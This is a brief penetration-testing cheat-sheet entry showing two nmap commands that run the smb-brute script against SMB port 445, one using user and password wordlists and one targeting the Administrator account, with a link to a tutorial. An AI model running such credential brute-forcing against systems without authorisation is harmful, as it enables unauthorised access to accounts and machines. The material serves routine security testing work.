# Nmap

```
$ nmap -p 445 -Pn -n --script smb-brute --script-args "userdb=users.lst,passdb=passwords.lst" [--script-args smbtype=<version>] <IP>

$ nmap -p 445 -Pn -n --script smb-brute --script-args "smbusername='Administrator',passdb=passwords.lst" [--script-args smbtype=<version>] <IP>
```

---
## References

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)